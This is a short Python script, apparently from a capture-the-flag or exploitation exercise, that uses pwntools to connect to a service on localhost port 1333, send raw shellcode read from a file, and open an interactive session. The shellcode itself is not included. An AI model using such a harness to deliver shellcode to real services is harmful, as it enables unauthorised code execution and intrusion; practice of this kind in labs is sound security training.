from pwn import *
r = remote("127.0.0.1", 1333)

f= open("shellcode-raw",'rb')
payload = f.read()
f.close()

r.send(payload)
r.interactive()